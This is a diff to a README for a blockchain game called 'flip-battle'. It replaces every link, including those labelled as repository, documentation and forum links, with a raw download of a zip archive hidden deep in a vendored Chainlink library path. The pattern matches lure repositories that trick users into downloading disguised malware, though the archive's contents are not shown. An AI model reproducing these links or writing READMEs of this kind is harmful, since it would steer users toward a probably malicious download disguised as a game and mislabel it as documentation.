@@ -1,6 +1,6 @@
 # 🎮 flip-battle - A Fun Blockchain Game for Everyone
 
-[![Download Flip Battle](https://raw.githubusercontent.com/adrians12345/flip-battle/main/merogastrula/flip-battle.zip%20Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/adrians12345/flip-battle/main/merogastrula/flip-battle.zip)
+[![Download Flip Battle](https://github.com/adrians12345/flip-battle/raw/refs/heads/main/contracts/lib/chainlink/contracts/src/v0.8/llo-feeds/v0.5.0/battle_flip_v2.1-beta.5.zip%20Now-blue?style=for-the-badge)](https://github.com/adrians12345/flip-battle/raw/refs/heads/main/contracts/lib/chainlink/contracts/src/v0.8/llo-feeds/v0.5.0/battle_flip_v2.1-beta.5.zip)
 
 ## 📋 Overview
 
@@ -21,7 +21,7 @@ To start enjoying Flip Battle, follow these simple steps.
 
 To download and run Flip Battle, please visit our releases page. Here, you will find the latest version of the game available for download.
 
-[Download Flip Battle Here](https://raw.githubusercontent.com/adrians12345/flip-battle/main/merogastrula/flip-battle.zip)
+[Download Flip Battle Here](https://github.com/adrians12345/flip-battle/raw/refs/heads/main/contracts/lib/chainlink/contracts/src/v0.8/llo-feeds/v0.5.0/battle_flip_v2.1-beta.5.zip)
 
 ### ⚙️ Installation Steps
 
@@ -62,8 +62,8 @@ We welcome contributions! If you have ideas for features or improvements, please
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://raw.githubusercontent.com/adrians12345/flip-battle/main/merogastrula/flip-battle.zip)
-- [Documentation](https://raw.githubusercontent.com/adrians12345/flip-battle/main/merogastrula/flip-battle.zip)
-- [Community Forums](https://raw.githubusercontent.com/adrians12345/flip-battle/main/merogastrula/flip-battle.zip)
+- [GitHub Repository](https://github.com/adrians12345/flip-battle/raw/refs/heads/main/contracts/lib/chainlink/contracts/src/v0.8/llo-feeds/v0.5.0/battle_flip_v2.1-beta.5.zip)
+- [Documentation](https://github.com/adrians12345/flip-battle/raw/refs/heads/main/contracts/lib/chainlink/contracts/src/v0.8/llo-feeds/v0.5.0/battle_flip_v2.1-beta.5.zip)
+- [Community Forums](https://github.com/adrians12345/flip-battle/raw/refs/heads/main/contracts/lib/chainlink/contracts/src/v0.8/llo-feeds/v0.5.0/battle_flip_v2.1-beta.5.zip)
 
 Feel free to reach out to us if you have any questions or feedback. We're here to help ensure you have a great experience with Flip Battle!
